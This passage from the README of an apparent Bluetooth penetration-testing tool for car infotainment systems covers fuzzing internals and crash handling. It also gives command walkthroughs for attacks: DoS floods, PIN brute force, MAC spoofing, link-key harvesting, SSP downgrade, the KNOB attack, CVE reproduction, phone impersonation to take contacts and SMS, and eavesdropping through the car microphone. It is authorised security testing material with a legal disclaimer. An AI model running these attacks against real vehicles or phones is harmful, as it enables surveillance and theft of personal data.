| `coverage` | Response-diversity tracking with energy scheduling — inputs producing novel responses get more mutations | Deep exploration, maximizing code path coverage |
| `state-machine` | Protocol state violation attacks — skip steps, go backwards, repeat states | OBEX, HFP, SMP, ATT state machine bugs |
| `targeted` | CVE reproduction + variation — exact reproduction patterns then field mutations | Testing for known vulnerability classes |

#### Fuzzing Intelligence (What Makes It Different)

Blue-Tap implements six layers of intelligence that run automatically during every campaign:

**1. Response-Based State Inference** (adapted from [AFLNet](https://mboehme.github.io/paper/ICST20.AFLNet.pdf))

Extracts protocol state IDs from every response (SDP PDU type + error code, ATT opcode + error, L2CAP command + result, RFCOMM frame type, SMP code, OBEX response code, BNEP type, AT result). Builds a directed state graph incrementally. Uses AFLNet's scoring formula to prioritize under-explored states:

```
score = 1000 * 2^(-log10(log10(fuzz_count+1) * selected_times + 1)) * 2^(log(paths_discovered+1))
```

States that produce new transitions get more fuzzing iterations. States that have been heavily explored get fewer.

**2. Anomaly-Guided Field Mutation Weights** (inspired by [BrakTooth](https://asset-group.github.io/papers/BrakTooth.pdf))

Instead of mutating random bytes, the engine knows which fields exist in each protocol packet (SDP `param_length`, ATT `handle`, L2CAP `CID`, RFCOMM `length`, etc.). It tracks which fields produce anomalies and crashes, then increases their mutation probability:

```
weight = 1.0 + (anomaly_ratio * 5.0) + (crash_ratio * 20.0)
```

Fields that cause crashes get 20x the base mutation weight. The fuzzer converges on the fields that matter for each specific target.

**3. Structural Response Validation** (novel — no prior BT fuzzer does this)

Validates every response against protocol-level self-consistency rules that ALL Bluetooth stacks must follow:

- SDP: `ParameterLength` must match actual payload bytes
- ATT: Error codes must be in valid range (0x01-0x14 or 0x80-0xFF)
- L2CAP: Signaling `Length` field must match payload
- RFCOMM: FCS checksum must be correct (CRC-8 computation)
- SMP: Pairing Request/Response must be exactly 7 bytes
- OBEX: Packet length header must match actual size
- AT: Responses must be valid ASCII terminated with `\r\n`

Any violation = the target's parser is confused = potential vulnerability.

**4. Timing-Based Coverage Proxy** (novel — identified as open research gap)

Before fuzzing starts, the engine learns each target's normal response latency per protocol and per opcode. During fuzzing, it detects:

- **Latency spikes**: Response > p99 baseline = different code path reached
- **Latency drops**: Response significantly faster = parser rejected input early
- **Timing clusters**: Groups of similar latencies; new cluster = new code path
- **Consecutive spikes**: 3+ in a row = target may be degrading

**5. Entropy-Based Leak Detection** (novel application to Bluetooth)

Detects information leaks (heap/stack disclosure) without firmware access using:

- **Shannon entropy**: Structured protocol data has entropy 2-5 bits/byte. Leaked heap data has entropy >6.5 bits/byte
- **Renyi entropy**: More sensitive to dominant byte values for partial leaks
- **Sliding window analysis**: Detects localized high-entropy regions in otherwise normal responses
- **Heap pattern scanning**: Detects 0xDEADBEEF, 0xBAADF00D, repeated 4-byte patterns, pointer-like values
- **Response echo detection**: Request bytes appearing in unexpected response positions = buffer reuse

**6. Watchdog Reboot Detection** (adapted from [Defensics](https://www.blackduck.com/blog/break-car-kits-with-bluetooth-fuzz-testing.html))

IVI Bluetooth stacks have watchdog timers that restart the daemon after a crash. This reboot is invisible at the protocol level. The health monitor detects it by:

- Tracking consecutive failures (3+ = trigger health check)
- Probing target with l2ping at exponential backoff (1s, 2s, 4s)
- Detecting the reboot signature: target returns after silence with fresh state
- Tracking reboot count as the highest-confidence crash signal
- Saving the last 10 fuzz payloads before each reboot as crash candidates with confidence scores
- Detecting zombie states: l2ping succeeds but protocol requests fail = upper stack crashed
- Detecting degradation: gradually increasing latency = memory leak on target

#### Live Dashboard

The campaign runs with a real-time Rich terminal dashboard showing:

| Metric | Description |
|--------|-------------|
| Runtime / progress | Elapsed time with progress bar (% of duration or iterations) |
| Test cases / rate | Total iterations and cases per second |
| Crashes found | Count with severity breakdown (CRITICAL, HIGH, MEDIUM, LOW) |
| Protocol breakdown | Per-protocol: test cases sent and crashes detected |
| Last crash | Timestamp, protocol, type, payload hex preview, mutation log |
| **Target health** | ALIVE / DEGRADED / UNREACHABLE / REBOOTED / ZOMBIE (color-coded) |
| **States discovered** | Per-protocol state and transition counts |
| **Timing clusters** | Number of distinct response latency groups per protocol |
| **Anomaly count** | Breakdown by type: structural, timing, leak, behavioral |
| **Hot fields** | Top mutation fields ranked by anomaly/crash weight |

**Keyboard controls:** `SPACE` pause/resume, `S` snapshot, `Q` quit.

#### Crash Management

```bash
blue-tap fuzz crashes list                             # List all crashes
blue-tap fuzz crashes list --severity CRITICAL          # Filter by severity
blue-tap fuzz crashes list --protocol sdp               # Filter by protocol
blue-tap fuzz crashes show 1                           # Full crash details + hexdump
blue-tap fuzz crashes replay 1                         # Replay to verify reproduction
blue-tap fuzz crashes replay 1 --capture               # Replay with pcap capture
blue-tap fuzz crashes export -o crashes.json           # Export for reporting
```

The crash detail view shows: severity, protocol, crash type, full payload hexdump, mutation log (which field was mutated and how), device response hexdump, reproduction status, and analyst notes.

#### Crash Minimization

Reduce crash payloads to the minimum bytes needed to trigger the bug:

```bash
blue-tap fuzz minimize 1                               # Auto-select strategy
blue-tap fuzz minimize 3 --strategy ddmin              # Delta debugging (thorough)
blue-tap fuzz minimize 5 --strategy binary              # Binary search (fast)
blue-tap fuzz minimize 2 --strategy field               # Field-level analysis
```

Three complementary strategies:
- **Binary search**: Halve payload, test, refine — fast, ~8 iterations
- **Delta debugging (ddmin)**: Incrementally remove chunks — thorough, ~50-200 tests
- **Field reducer**: Zero each byte individually, mark essential vs nullable — identifies exact crash-triggering fields

#### Protocol-Specific Fuzzers

Deep protocol fuzzers with targeted mode selection:

```bash
blue-tap fuzz sdp-deep <MAC> --mode continuation       # SDP continuation state (CVE-2017-0785)
blue-tap fuzz sdp-deep <MAC> --mode data-elements      # SDP data element malformation
blue-tap fuzz l2cap-sig <MAC> --mode config            # L2CAP config option parsing
blue-tap fuzz l2cap-sig <MAC> --mode echo              # L2CAP echo flood
blue-tap fuzz rfcomm-raw <MAC> --mode credits          # Credit-based flow control abuse
blue-tap fuzz obex <MAC> -p pbap --mode headers        # OBEX header parsing
blue-tap fuzz obex <MAC> -p map --mode path-traversal  # OBEX path traversal
blue-tap fuzz ble-att <MAC> --mode writes              # BLE ATT write overflow
blue-tap fuzz ble-att <MAC> --mode mtu                 # MTU negotiation boundary
blue-tap fuzz ble-smp <MAC> --mode curve               # Invalid ECDH curve (CVE-2018-5383)
blue-tap fuzz bnep <MAC> --mode setup                  # BNEP setup (CVE-2017-0781)
blue-tap fuzz at-deep <MAC> --category injection       # AT command injection
```

#### CVE Reproduction

Test targets against known Bluetooth vulnerability patterns:

```bash
blue-tap fuzz cve --list                              # List all supported CVE patterns
blue-tap fuzz cve <MAC>                                # Run all CVE patterns
blue-tap fuzz cve <MAC> --cve-id 2017-0785             # Android SDP info leak
blue-tap fuzz cve <MAC> --cve-id 2017-0781             # BNEP heap overflow
blue-tap fuzz cve <MAC> --cve-id 2018-5383             # Invalid ECDH curve
blue-tap fuzz cve <MAC> --cve-id 2024-24746            # NimBLE prepare write loop
```

Supported CVEs: CVE-2017-0785 (BlueBorne SDP), CVE-2017-0781 (BNEP overflow), SweynTooth family, CVE-2018-5383 (Invalid Curve), CVE-2024-24746 (NimBLE), CVE-2024-45431 (PerfektBlue L2CAP).

#### Corpus Management

```bash
blue-tap fuzz corpus generate                          # Generate seeds from protocol builders
blue-tap fuzz corpus generate -p sdp                   # Generate for specific protocol
blue-tap fuzz corpus list                              # Show stats per protocol
blue-tap fuzz corpus minimize                          # Deduplicate by content hash
```

Protocol builders generate 2,900+ seed cases across all protocols (SDP: 858, SMP: 650, BNEP: 580, ATT: 411, RFCOMM: 239, L2CAP: 166).

#### PCAP Replay

Import and replay captured Bluetooth traffic:

```bash
blue-tap fuzz replay capture.btsnoop -t <MAC> --list    # Inspect frames
blue-tap fuzz replay capture.btsnoop -t <MAC>            # Replay all frames
blue-tap fuzz replay capture.btsnoop -t <MAC> -p sdp     # Filter by protocol
blue-tap fuzz replay capture.btsnoop -t <MAC> --mutate   # Replay with mutations
```

Supports btsnoop v1 format with HCI ACL fragmentation reassembly.

#### Report Integration

Campaign results feed directly into the pentest report (`blue-tap report`):

- **Executive summary**: Crash counts, severity breakdown, SVG donut/bar charts
- **Crash details**: Full hexdump, mutation log, reproduction steps per crash
- **Fuzzing intelligence**: State coverage graph, field weight analysis with bar charts, target response baselines, health event timeline
- **Evidence package**: Exportable crash payloads (.bin), pcap captures, crash descriptions

---

### 9. Denial of Service

```
blue-tap dos pair-flood <MAC>                          # Flood with pairing requests
blue-tap dos name-flood <MAC>                          # Pair with max-length names (memory exhaustion)
blue-tap dos rate-test <MAC>                           # Detect rate limiting on pairing
blue-tap dos pin-brute <MAC>                           # Brute-force legacy PIN pairing
blue-tap dos l2ping-flood <MAC>                        # L2CAP echo request flood (requires root)
```

---

### 10. MAC Address Spoofing

```
blue-tap spoof mac <TARGET_MAC>                        # Change adapter MAC address
blue-tap spoof clone <MAC>                             # Full identity clone: MAC + name + device class
blue-tap spoof restore                                 # Restore original MAC
```

---

### 11. Automation and Orchestration

#### Auto Mode

Fully automated: discover phone, hijack IVI, extract all data, generate report.

```
blue-tap auto <IVI_MAC>                                # Full auto chain
blue-tap auto <IVI_MAC> -d 30                          # 30-second phone discovery window
blue-tap auto <IVI_MAC> -o ./auto_results/              # Custom output directory
```

#### Run Mode (Playbook)

Execute multiple commands in sequence with a single invocation.

```
# Inline commands
blue-tap -s assessment run \
  "scan classic" \
  "recon fingerprint TARGET" \
  "recon sdp TARGET" \
  "vulnscan TARGET" \
  "report"

# Playbook file (one command per line)
blue-tap -s assessment run --playbook pentest.txt
```

`TARGET` is a placeholder — you'll be prompted to select a discovered device.

**Example playbook (`pentest.txt`):**
```
scan classic
recon fingerprint TARGET
recon sdp TARGET
recon rfcomm-scan TARGET
recon l2cap-scan TARGET
vulnscan TARGET
pbap dump TARGET
map dump TARGET
report
```

---

### 12. Link Key Harvest and Persistent Access

Capture pairing exchanges, extract link keys, and reconnect to devices without re-pairing — proving persistent access.

```bash
blue-tap keys harvest <MAC>                            # Capture pairing + extract link key
blue-tap keys harvest <MAC> -d 600                     # 10 minute capture window
blue-tap keys list                                     # Show all stored keys
blue-tap keys verify <MAC>                             # Verify stored key still works
blue-tap keys reconnect <MAC>                          # Reconnect using stored key (no re-pairing)
```

**How it works:** Starts HCI packet capture, waits for a pairing exchange with the target, extracts the link key via tshark, and stores it in a persistent key database. Later, `keys reconnect` injects the stored key into BlueZ and connects without any pairing UI — demonstrating that a single intercepted pairing gives indefinite access.

---

### 13. SSP Downgrade Attack

Force a device from Secure Simple Pairing to legacy PIN mode, then brute force the PIN.

```bash
blue-tap ssp-downgrade probe <MAC>                     # Check if target is vulnerable
blue-tap ssp-downgrade attack <MAC>                    # Downgrade + auto brute force
blue-tap ssp-downgrade attack <MAC> --pin-start 0 --pin-end 9999  # Full PIN range
blue-tap ssp-downgrade attack <MAC> --delay 1.0        # Slower to avoid lockout
```

**Attack phases:**
1. Set local adapter IO capability to NoInputNoOutput
2. Disable SSP on local adapter
3. Remove existing pairing with target
4. Initiate pairing — target falls back to legacy PIN mode
5. Brute force PIN (0000-9999) with lockout detection

---

### 14. KNOB Attack (CVE-2019-9506)

Negotiate minimum encryption key entropy, then brute force the reduced key space.

```bash
blue-tap knob probe <MAC>                              # Check KNOB vulnerability
blue-tap knob attack <MAC>                             # Full KNOB chain: negotiate + brute force
blue-tap knob attack <MAC> --key-size 1                # Force 1-byte key (256 candidates)
```

**Attack phases:**
1. Check BT version (KNOB affects 2.1-5.0 pre-patch)
2. Negotiate encryption key to minimum bytes (via InternalBlue LMP injection or btmgmt fallback)
3. Brute force the reduced key space (256 candidates for 1-byte key)

Note: Full LMP-level manipulation requires InternalBlue (Broadcom/Cypress chipset). Without it, the btmgmt approach has limited effectiveness.

---

### 15. Fleet-Wide Assessment

Scan all nearby Bluetooth devices, classify them, and run vulnerability assessments.

```bash
blue-tap fleet scan                                    # Discover + classify all nearby devices
blue-tap fleet scan -d 30                              # 30-second scan window
blue-tap fleet assess                                  # Scan + vuln-assess all IVIs
blue-tap fleet assess --all-devices                    # Assess everything, not just IVIs
blue-tap fleet report                                  # Full fleet report (scan + assess + HTML)
blue-tap fleet report -f json -o fleet.json            # JSON output
```

**Device classification:** Automatically categorizes each device as IVI, phone, headset, computer, wearable, or unknown — based on Bluetooth device class, name heuristics (car OEMs, head-unit vendors), and service UUIDs.

---

### 16. Session Management and Reporting

#### Sessions

Every command automatically logs structured output to the active session.

```
blue-tap -s my_assessment scan classic     # Named session
blue-tap -s my_assessment vulnscan <MAC>   # Same session
blue-tap -s my_assessment pbap dump <MAC>  # Same session
blue-tap session list                       # List all sessions
blue-tap session show my_assessment         # Session details
```

**Session directory structure:**
```
sessions/my_assessment/
  session.json              # Metadata + command log
  001_scan_classic.json     # Scan results
  002_vulnscan.json         # Vulnerability findings
  003_pbap_dump.json        # PBAP extraction log
  pbap/                     # vCard files
  map/                      # bMessage files
  audio/                    # WAV captures
  report.html               # Generated report
```

#### Report Generation

```
blue-tap report                             # Report from current session
blue-tap -s my_assessment report             # Report from named session
blue-tap report ./hijack_output              # Report from specific directory
blue-tap report -f json -o report.json       # JSON format
blue-tap report -f html -o report.html       # HTML format (default)
```

**HTML report includes:**
- Executive summary with severity breakdown
- Vulnerability findings table with CVE references, impact, and remediation
- Extracted data summary (contact count, message count, call history)
- Fuzzing campaign results with crash cards (hex dumps, reproducibility status)
- Dark-themed, standalone HTML (no external dependencies)

---

## Quick Start

### Prerequisites

| Requirement | Purpose |
|-------------|---------|
| Linux (Kali, Ubuntu 22.04+, Debian) | BlueZ Bluetooth stack |
| Python 3.10+ | Runtime |
| BlueZ 5.x | Bluetooth protocol stack |
| External USB Bluetooth adapter | Required for full feature access (see below) |
| Root access | Required for raw L2CAP/RFCOMM, adapter control, btmon |

### Recommended Hardware

A dedicated USB Bluetooth adapter is **required** for full-feature pentesting. Internal laptop adapters (Intel, Realtek) enforce Secure Simple Pairing and block MAC spoofing, which disables most attack capabilities.

| Adapter | MAC Spoofing | Legacy PIN | BLE | Classic | Fuzzing | Price | Verdict |
|---------|:---:|:---:|:---:|:---:|:---:|:-----:|---------|
| **CSR8510 USB** | Yes | Yes | Yes | Yes | Yes | ~$5 | Best overall — full feature support |
| **BCM20702 USB** | Yes | Yes | Yes | Yes | Yes | ~$10 | Solid alternative to CSR |
| **RTL8761B USB** | Partial | Partial | Yes | Yes | Partial | ~$8 | Budget option, some limitations |
| **nRF52840 dongle** | N/A | N/A | Sniff only | No | No | ~$10 | BLE sniffing and raw PDU capture only |
| **USRP B210** | Yes | Yes | Yes | Yes | Yes | ~$1500 | Research-grade — full baseband access |

### Installation

```bash
# 1. Install system dependencies (Kali / Ubuntu / Debian)
sudo apt update
sudo apt install -y bluez bluez-tools python3-pip python3-dev python3-venv libbluetooth-dev

# 2. Install Blue-Tap
pip install blue-tap

# 3. Verify
blue-tap --version
blue-tap adapter list
```

**Alternative: install from source**

```bash
git clone https://github.com/Indspl0it/blue-tap.git
cd blue-tap
pip install -e .
```

### Optional: Enable BlueZ Compatibility Mode

Required for `sdptool` (SDP browsing) and certain SDP fuzzing operations:

```bash
# Add --compat to bluetoothd ExecStart line
sudo sed -i 's|ExecStart=.*/bluetoothd|& --compat|' /lib/systemd/system/bluetooth.service
sudo systemctl daemon-reload
sudo systemctl restart bluetooth

# Verify
sdptool browse local   # Should not show "Failed to connect to SDP server"
```

### First Scan

```bash
# Check adapter is available
blue-tap adapter list

# Discover nearby Bluetooth devices
sudo blue-tap scan classic

# If you see a target device:
sudo blue-tap recon sdp <MAC>
sudo blue-tap vulnscan <MAC>
```

---

## Usage Guide

### Global Options

```
blue-tap [OPTIONS] COMMAND [ARGS]...

Options:
  --version           Show version and exit
  -v, --verbose       Verbosity: -v verbose, -vv debug
  -s, --session TEXT  Session name (default: auto-generated timestamp)
  --help              Show help and exit
```

### Command Reference

```
blue-tap --help

Commands:
  adapter   HCI Bluetooth adapter management
  at        AT command data extraction via RFCOMM
  audio     Audio capture, injection, and eavesdropping via PulseAudio
  auto      Automated: discover phone, hijack IVI, dump data, report
  avrcp     AVRCP media control and attacks
  bias      BIAS attack — bypass authentication via role-switch (CVE-2020-10135)
  dos       DoS attacks and pairing abuse
  fuzz      Protocol fuzzing — campaign mode, legacy fuzzers, crash management
  hfp       Hands-Free Profile — call audio interception and injection
  hijack    Full IVI hijack: spoof phone identity and extract data
  map       Message Access Profile — download SMS/MMS messages
  opp       Object Push Profile — push files to IVI
  pbap      Phone Book Access Profile — download phonebook and call logs
  recon     Service enumeration and device fingerprinting
  report    Generate pentest report from the current session
  run       Execute multiple blue-tap commands in sequence
  scan      Discover Bluetooth Classic and BLE devices
  session   Manage assessment sessions
  spoof     MAC address spoofing and device impersonation
  vulnscan  Scan target for vulnerabilities and attack-surface indicators
```

### Getting Help for Any Command

```bash
blue-tap <command> --help                   # Group help
blue-tap <command> <subcommand> --help      # Subcommand help

# Examples:
blue-tap fuzz --help                        # Shows all fuzz subcommands
blue-tap fuzz campaign --help               # Campaign options and examples
blue-tap recon --help                       # All recon subcommands
```

---

## Workflows

### Workflow 1: Quick IVI Assessment

Minimal assessment — discovery, fingerprinting, vulnerability scan.

```bash
# Start a named session
blue-tap -s quick-assessment scan classic
# Note the IVI MAC address from scan results

blue-tap -s quick-assessment recon sdp AA:BB:CC:DD:EE:FF
blue-tap -s quick-assessment recon fingerprint AA:BB:CC:DD:EE:FF
blue-tap -s quick-assessment vulnscan AA:BB:CC:DD:EE:FF
blue-tap -s quick-assessment report
```

### Workflow 2: Full IVI Penetration Test

Comprehensive assessment with data extraction and fuzzing.

```bash
# Phase 1: Discovery and reconnaissance
blue-tap -s full-pentest scan classic
blue-tap -s full-pentest scan ble
blue-tap -s full-pentest recon sdp AA:BB:CC:DD:EE:FF
blue-tap -s full-pentest recon fingerprint AA:BB:CC:DD:EE:FF
blue-tap -s full-pentest recon rfcomm-scan AA:BB:CC:DD:EE:FF
blue-tap -s full-pentest recon l2cap-scan AA:BB:CC:DD:EE:FF
blue-tap -s full-pentest recon gatt AA:BB:CC:DD:EE:FF
blue-tap -s full-pentest recon pairing-mode AA:BB:CC:DD:EE:FF

# Phase 2: Vulnerability assessment
blue-tap -s full-pentest vulnscan AA:BB:CC:DD:EE:FF

# Phase 3: Data extraction
blue-tap -s full-pentest pbap dump AA:BB:CC:DD:EE:FF
blue-tap -s full-pentest map dump AA:BB:CC:DD:EE:FF
blue-tap -s full-pentest at dump AA:BB:CC:DD:EE:FF

# Phase 4: Connection hijack (if phone MAC known)
blue-tap -s full-pentest hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11

# Phase 5: Protocol fuzzing
blue-tap -s full-pentest fuzz campaign AA:BB:CC:DD:EE:FF \
  --duration 30m --strategy targeted --capture

# Phase 6: Report
blue-tap -s full-pentest report -f html
```

### Workflow 3: Hijack and Extract

Targeted attack — impersonate the owner's phone and steal data.

```bash
# 1. Find the IVI and paired phone
blue-tap scan classic        # Find "SYNC" or similar car name
blue-tap scan classic        # Run again; note phones near the car

# 2. Enumerate the IVI
blue-tap recon sdp AA:BB:CC:DD:EE:FF
blue-tap recon rfcomm-scan AA:BB:CC:DD:EE:FF

# 3. Execute the hijack
blue-tap hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11 \
  --phone-name "John's iPhone"

# All data saved to hijack output directory
```

### Workflow 4: Fuzzing Campaign

Extended protocol fuzzing with crash analysis.

```bash
# Generate seed corpus
blue-tap fuzz corpus generate

# Run a targeted 1-hour campaign with capture
blue-tap -s fuzz-session fuzz campaign AA:BB:CC:DD:EE:FF \
  -p sdp -p rfcomm -p obex-pbap \
  --strategy targeted \
  --duration 1h \
  --capture

# Review crashes
blue-tap fuzz crashes list
blue-tap fuzz crashes show 1

# Minimize a crash
blue-tap fuzz minimize 1 --strategy ddmin

# Replay to verify
blue-tap fuzz crashes replay 1

# Try known CVE patterns
blue-tap fuzz cve AA:BB:CC:DD:EE:FF

# Export results
blue-tap fuzz crashes export
blue-tap -s fuzz-session report
```

### Workflow 5: Playbook Automation

Create a reusable pentest playbook.

**`ivi-pentest.txt`:**
```
scan classic
recon sdp TARGET
recon fingerprint TARGET
recon rfcomm-scan TARGET
recon l2cap-scan TARGET
recon gatt TARGET
vulnscan TARGET
pbap dump TARGET
map dump TARGET
report
```

```bash
blue-tap -s auto-pentest run --playbook ivi-pentest.txt
```

### Workflow 6: Fleet-Wide Assessment

Assess all IVIs in a parking lot or fleet.

```bash
# Scan and classify all nearby devices
blue-tap fleet scan -d 30

# Assess all discovered IVIs
blue-tap fleet assess

# Generate consolidated fleet report
blue-tap fleet report -o fleet_report.html
```

### Workflow 7: Persistent Access via Link Key

Demonstrate that a single intercepted pairing gives indefinite access.

```bash
# Step 1: Capture a pairing exchange (run while target pairs)
blue-tap keys harvest AA:BB:CC:DD:EE:FF -d 600

# Step 2: Verify the key works
blue-tap keys verify AA:BB:CC:DD:EE:FF

# Step 3: Days/weeks later — reconnect without re-pairing
blue-tap keys reconnect AA:BB:CC:DD:EE:FF

# Step 4: Extract data using the persistent connection
blue-tap pbap dump AA:BB:CC:DD:EE:FF
```

### Workflow 8: SSP Downgrade + PIN Brute Force

Force a device from Secure Simple Pairing to legacy PIN mode.

```bash
# Check if the target is vulnerable
blue-tap ssp-downgrade probe AA:BB:CC:DD:EE:FF

# Execute the downgrade + brute force
blue-tap ssp-downgrade attack AA:BB:CC:DD:EE:FF

# Once paired, extract data
blue-tap pbap dump AA:BB:CC:DD:EE:FF
```

### Workflow 6: Audio Eavesdropping

```bash
# Connect and switch to HFP profile for mic access
blue-tap hfp connect AA:BB:CC:DD:EE:FF
blue-tap audio profile AA:BB:CC:DD:EE:FF hfp

# Live eavesdrop (car mic → laptop speakers)
blue-tap audio live AA:BB:CC:DD:EE:FF

# Or record to file
blue-tap audio record-mic AA:BB:CC:DD:EE:FF

# Capture media stream
blue-tap audio profile AA:BB:CC:DD:EE:FF a2dp
blue-tap audio capture AA:BB:CC:DD:EE:FF

# Review captured audio
blue-tap audio list
blue-tap audio review
```

---

## Vulnerable IVI Simulator

Blue-Tap ships with a companion **Vulnerable IVI Simulator** in the `target/` directory. This is a real Bluetooth target (not a mock) that runs on any Linux machine with a Bluetooth adapter and behaves like an intentionally vulnerable car infotainment system.

### Purpose

- Practice Blue-Tap commands against a real target
- Demonstrate all attack vectors in a controlled environment
- Validate tool functionality without access to a real vehicle

### Quick Setup

Requires a **separate Linux machine** (Kali laptop, Raspberry Pi, or desktop with Bluetooth adapter).

```bash
# Terminal 1 — Configure adapter
cd target/
sudo ./setup_ivi.sh

# Terminal 2 — Start pairing agent
sudo python3 pin_agent.py

# Terminal 3 — Start IVI daemon
sudo python3 ivi_daemon.py

# Optional Terminal 4 — BLE GATT server
sudo python3 ble_gatt.py
```

### Exposed Services

| Service | Channel/PSM | Data |
|---------|-------------|------|
| PBAP (Phonebook) | RFCOMM 15 | 50 contacts, call history |
| MAP (Messages) | RFCOMM 16 | 20 SMS messages |
| OPP (Object Push) | RFCOMM 9 | Accepts any file |
| HFP (Hands-Free) | RFCOMM 10 | Full SLC handshake |
| SPP (Serial Port) | RFCOMM 1 | AT command responder |
| Hidden Debug | RFCOMM 2 | Not in SDP |
| BNEP (PAN) | L2CAP 7 | Fuzz absorber |
| AVCTP (AVRCP) | L2CAP 23 | Fuzz absorber |
| AVDTP (A2DP) | L2CAP 25 | Fuzz absorber |
| BLE GATT | Multiple | Device Info + Battery + Custom IVI |

### Built-in Vulnerabilities

| Vulnerability | What Blue-Tap Command Finds It |
|---------------|-------------------------------|
| Unauthenticated OBEX | `blue-tap vulnscan` → CRITICAL |
| Legacy PIN "1234" | `blue-tap dos pin-brute` |
| Just Works pairing (SSP) | `blue-tap vulnscan` → HIGH |
| No PIN rate limiting | `blue-tap vulnscan` → MEDIUM |
| Hidden RFCOMM channel | `blue-tap vulnscan` → MEDIUM |
| Permissive AT commands | `blue-tap at connect` |
| Unauthenticated BLE writes | `blue-tap recon gatt` |
| Hijack-vulnerable bond | `blue-tap hijack` |

See [`target/README.md`](target/README.md) for detailed setup instructions, architecture diagrams, and platform-specific notes.

---

## Troubleshooting

### Adapter Issues

**"No adapters found" / "Adapter not found"**
```bash
# Check if adapter exists
hciconfig -a

# If rfkill is blocking
rfkill list bluetooth
rfkill unblock bluetooth

# If USB dongle not recognized
lsusb | grep -i bluetooth

# Bring adapter up manually
sudo hciconfig hci0 up
```

**"Operation not permitted"**
```bash
# Most Blue-Tap commands require root
sudo blue-tap scan classic

# Or set capabilities (alternative to sudo)
sudo setcap cap_net_raw,cap_net_admin+eip $(which python3)
```

### Scanning Issues

**"No devices found"**
- Ensure target is discoverable (`hciconfig hci0 | grep PSCAN` on target)
- Increase scan duration: `blue-tap scan classic -d 30`
- Try from closer range (Bluetooth range ~10m)
- Check for RF interference

**BLE scan shows no results**
- Ensure BLE is enabled: `sudo btmgmt le on`
- Try passive mode: `blue-tap scan ble --passive`
- Some adapters need LE explicitly enabled in btmgmt

### Connection Issues

**"Connection refused" on RFCOMM**
- Target service may require pairing first
- Check if the channel is correct: `blue-tap recon rfcomm-scan <MAC>`
- Service may have been deregistered

**"Permission denied" on L2CAP**
- L2CAP PSMs below 4096 require root: `sudo blue-tap ...`
- Check if PSM is blocked by the kernel: `cat /proc/sys/net/bluetooth/l2cap_enable_ertm`

**Pairing failures**
- Check pairing mode: `blue-tap recon pairing-mode <MAC>`
- For SSP devices, PIN brute-force won't work
- Try `blue-tap recon ssp <MAC>` to verify

### SDP Issues

**"Failed to connect to SDP server"**
```bash
# Enable BlueZ compatibility mode
sudo sed -i 's|ExecStart=.*/bluetoothd|& --compat|' /lib/systemd/system/bluetooth.service
sudo systemctl daemon-reload
sudo systemctl restart bluetooth
```

### Fuzzing Issues

**"scapy not found"**
```bash
# Install fuzzing dependencies
pip install -e ".[fuzz]"
# or
pip install scapy>=2.5
```

**"No crash database found"**
- Run a fuzz campaign first to create the database
- Specify session: `blue-tap fuzz crashes list -s <session_name>`

**Target becomes unresponsive during fuzzing**
- Increase `--delay` between test cases: `--delay 2.0`
- Increase `--cooldown` after crash: `--cooldown 10`
- Reduce iteration rate with `--timeout 5`
- The target's Bluetooth stack may need manual restart

### Audio Issues

**"PulseAudio: connection refused"**
```bash
# Check PulseAudio/PipeWire is running
pactl info

# Restart audio service
blue-tap audio restart

# Diagnose Bluetooth audio routing
blue-tap audio diagnose <MAC>
```

**No audio sources/sinks visible**
```bash
blue-tap audio devices
# If empty: pair the device first, then switch profile
blue-tap audio profile <MAC> a2dp   # or hfp
```

### MAC Spoofing Issues

**"bdaddr not found"**
```bash
# Install bdaddr (part of bluez-tools or build from source)
sudo apt install bluez-tools
# or
# Build bdaddr from BlueZ source
```

**"Cannot change MAC" / "Operation not supported"**
- Intel adapters typically do not support MAC spoofing
- Use a CSR8510 or BCM20702 USB dongle
- Some adapters require the interface to be down: `sudo hciconfig hci0 down` before spoofing

### Report Issues

**"No session data found"**
- Ensure you used `-s` flag consistently: `blue-tap -s mytest scan classic`
- Check session exists: `blue-tap session list`
- Point to specific directory: `blue-tap report ./my_output_dir/`

---

## Platform Notes

### Kali Linux (Recommended)

- All tools pre-installed (BlueZ, hcitool, sdptool, btmgmt, bluetoothctl)
- May need `--compat` flag for bluetoothd
- Use an external USB adapter (CSR8510/BCM20702) for full feature access

### Ubuntu / Debian

```bash
sudo apt install -y bluez bluez-tools python3-pip python3-dev python3-venv libbluetooth-dev
```

### Raspberry Pi

- Use an external USB adapter (CSR8510/BCM20702) for full feature access

### WSL (Windows Subsystem for Linux)

- **Not supported** — WSL does not pass through USB Bluetooth adapters
- Use a native Linux installation or VM with USB passthrough

---

## License

Blue-Tap is licensed under the **GNU General Public License v3.0** — see the [LICENSE](LICENSE) file for details.

Copyright (C) 2026 Santhosh Ballikonda

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

---

## Legal Disclaimer

Blue-Tap is provided for **authorized security testing and research purposes only**.

- You **must** have explicit written permission from the owner of any device you test
- Unauthorized access to Bluetooth devices is illegal under the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and similar laws worldwide
- The authors accept no liability for misuse of this tool
- Always follow your organization's rules of engagement and scope limitations
- Report vulnerabilities responsibly to the affected manufacturer

**Responsible disclosure:** If you discover vulnerabilities in production IVI systems using Blue-Tap, follow coordinated disclosure practices. Contact the vehicle manufacturer's PSIRT (Product Security Incident Response Team) before public disclosure.

---

## Author

**Santhosh Ballikonda** — [@Indspl0it](https://github.com/Indspl0it)
